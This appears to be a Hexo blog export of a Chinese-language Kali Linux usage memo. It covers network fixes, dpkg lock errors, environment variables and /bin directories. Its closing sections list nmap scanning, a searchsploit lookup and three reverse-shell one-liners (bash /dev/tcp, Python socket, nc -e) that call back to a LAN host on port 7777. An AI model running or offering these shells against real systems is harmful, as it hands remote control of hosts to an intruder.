{"title":"Kali-usage","slug":"Kali-usage","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:47:09.267Z","comments":true,"path":"api/articles/Kali-usage.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"Kali-linux-使用备忘\"><a href=\"#Kali-linux-使用备忘\" class=\"headerlink\" title=\"Kali linux 使用备忘\"></a>Kali linux 使用备忘</h1><h2 id=\"网络无法连接\"><a href=\"#网络无法连接\" class=\"headerlink\" title=\"网络无法连接\"></a>网络无法连接</h2><ol>\n<li><p>ifconfig 只有 Local</p>\n<p>先检查一下 DNS 有没有忘记配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/resolv.conf</span><br><span class=\"line\">   nameserver 8.8.8.8 or your dns server</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   </span><br><span class=\"line\">检查一下 eth0 网卡</span><br><span class=\"line\">   </span><br><span class=\"line\">   ifconfig eth0 up</span><br><span class=\"line\">vi /etc/network/interfaces</span><br><span class=\"line\">   iface eth0 inet dhcp</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\"> service </span>networking restart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"无法获得锁\"><a href=\"#无法获得锁\" class=\"headerlink\" title=\"无法获得锁\"></a>无法获得锁</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)</span><br><span class=\"line\">E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</span><br></pre></td></tr></table></figure>\n\n<p>只要</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm /var/cache/apt/archives/lock </span><br><span class=\"line\">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Environment-variables\"><a href=\"#Environment-variables\" class=\"headerlink\" title=\"Environment variables\"></a>Environment variables</h2><p>可以分为两大类：enviroment variables and shell variables</p>\n<p><strong>Enviroment varialbes</strong> : 可以在整个系统范围内使用，并且被所有衍生的子进程和 shells 所继承。</p>\n<p><strong>Shell varialbes</strong> : 只能被用于当前的 shell 。就像 zsh 和 bash ，每个 shell 都有自己的内部变量集。</p>\n<p>下面这些命令允许你列出来 enviroment vraiables 并且可以配置。</p>\n<ul>\n<li><code>env</code> – The command allows you to run another program in a  custom environment without modifying the current one. When used without  an argument it will print a list of the current environment variables.</li>\n<li><code>printenv</code> – The command prints all or the specified environment variables.</li>\n<li><code>set</code> – The command sets or unsets shell variables. When used without an argument it will print a list of all variables including  environment and shell variables, and shell functions.</li>\n<li><code>unset</code> – The command deletes shell and environment variables.</li>\n<li><code>export</code> – The command sets environment variables.</li>\n</ul>\n<h3 id=\"Persistent-Environment-Variables\"><a href=\"#Persistent-Environment-Variables\" class=\"headerlink\" title=\"Persistent Environment Variables\"></a>Persistent Environment Variables</h3><p>为了环境变量能持久(?) 我们需要到 bash 配置文件中定义一下。在大多数 Linux 发行版里我们需要重启一个会话。环境变量从下面几个文件里读取：</p>\n<ul>\n<li><p><code>/etc/environment</code> - Use this file to set up system-wide environment variables. Variables in this file are set in the following format:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FOO=bar</span><br><span class=\"line\">VAR_TEST=<span class=\"string\">\"Test Var\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>/etc/profile</code> - Variables set in this file are loaded  whenever a bash login shell is entered. When declaring environment  variables in this file you need to use the <code>export</code> command:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export JAVA_HOME=<span class=\"string\">\"/path/to/java/home\"</span></span><br><span class=\"line\">export PATH=<span class=\"variable\">$PATH:</span><span class=\"variable\">$JAVA_HOME</span>/bin</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Per-user shell specific configuration files. For example, if you are using Bash, you can declare the variables in the <code>~/.bashrc</code>:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=<span class=\"string\">\"<span class=\"variable\">$HOME</span>/bin:<span class=\"variable\">$PATH</span>\"</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p>To load the new environment variables into the current shell session use the <a href=\"https://linuxize.com/post/bash-source-command/\" target=\"_blank\" rel=\"noopener\"><code>source</code></a> command:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"/bin\"></a>/bin</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin      是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、<span class=\"built_in\">kill</span>、ls、mkdir、more、mount、rm、su、tar等。    </span><br><span class=\"line\">/sbin     一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。   </span><br><span class=\"line\">/usr/bin　是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</span><br><span class=\"line\">/usr/sbin 放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、<span class=\"keyword\">in</span>.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。    </span><br><span class=\"line\">如果新装的系统，运行一些很正常的诸如：shutdown，fdisk的命令时，悍然提示：bash:<span class=\"built_in\">command</span> not found。那么首先就要考虑root 的<span class=\"variable\">$PATH</span>里是否已经包含了这些环境变量。    </span><br><span class=\"line\">可以查看PATH，如果是：PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/bin则需要添加成如下：PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/bin:/sbin:/usr/bin:/usr/sbin</span><br></pre></td></tr></table></figure>\n\n<p>在 Kali 中我们可以看到 /bin/sh 是一个静态链接，链接到 <code>dash</code> ,而 <code>dash</code> 与 <code>bash</code> 一样，作为系统 <code>shell</code> 使用。</p>\n<p>查看当前使用 shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll `which sh`</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp-scan -l</span><br><span class=\"line\"></span><br><span class=\"line\">nmap -sn 192.168.0.0/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -p- -A 192.168.0.105</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whatweb url</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><h3 id=\"搜索脚本\"><a href=\"#搜索脚本\" class=\"headerlink\" title=\"搜索脚本\"></a>搜索脚本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchsploit druopl 7</span><br></pre></td></tr></table></figure>\n\n<p>如果是 py 文件，可以直接根据提供的路径运行</p>\n<h2 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>python</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.0.4&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);</span><br></pre></td></tr></table></figure>\n\n<p>nc 反向连接，前提是目标机器有nc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure>\n\n<p>nc 安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、下载安装</span><br><span class=\"line\">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class=\"line\">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class=\"line\">cd /usr/local</span><br><span class=\"line\">mv netcat-0.7.1 netcat</span><br><span class=\"line\">cd /usr/local/netcat</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">2、配置</span><br><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">添加以下内容：</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">set</span>  netcat path</span></span><br><span class=\"line\">export NETCAT_HOME=/usr/local/netcat</span><br><span class=\"line\">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class=\"line\">保存，退出，并使配置生效：</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">3、测试</span><br><span class=\"line\">nc -help成功</span><br></pre></td></tr></table></figure>\n\n","categories":[{"name":"linux","slug":"linux","count":1,"path":"api/categories/linux.json"}],"tags":[{"name":"linux","slug":"linux","count":1,"path":"api/tags/linux.json"}]}